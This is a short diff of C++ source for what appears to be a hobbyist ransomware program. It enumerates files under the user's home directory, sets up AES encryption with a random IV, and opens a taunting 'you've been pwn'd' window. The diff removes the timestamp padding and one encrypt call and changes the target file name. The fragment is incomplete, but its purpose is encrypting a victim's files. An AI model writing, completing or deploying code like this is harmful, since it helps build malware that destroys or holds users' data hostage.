@@ -7,12 +7,6 @@ int main(int argc, char* argv[]) {
     std::string usrHome = std::string(userprofile);
     const int width = 800, height = 600;
     std::string nowUnix = lars::logic::getUnixMS();
-    if (nowUnix.size() < 16) {
-        nowUnix.resize(16, '0');
-    }
-    if (nowUnix.size() > 16) {
-        nowUnix.resize(16);
-    }
     AutoSeededRandomPool asrp;
     SecByteBlock iv(AES::BLOCKSIZE);
     asrp.GenerateBlock(iv, sizeof(iv));
@@ -21,7 +15,7 @@ int main(int argc, char* argv[]) {
         std::cout << "SDL_Init Error: " << SDL_GetError() << std::endl;
         return 1;
     }
-    std::string testfile = "bederaldinnasif.txt";
+    std::string testfile = "test.exe";
     std::cout << nowUnix;
     fs::path path = usrHome.c_str();
     std::vector<fs::path> file_paths;
@@ -31,7 +25,6 @@ int main(int argc, char* argv[]) {
         f << file_path << std::endl;
     }
     f.close();
-    lars::aes::encrypt(testfile, key, iv);
     SDL_Window* window = SDL_CreateWindow("UwU you've been pwn'd by a gay, a furry, and a hacker",
         SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED,
         width, height, SDL_WINDOW_ALLOW_HIGHDPI);
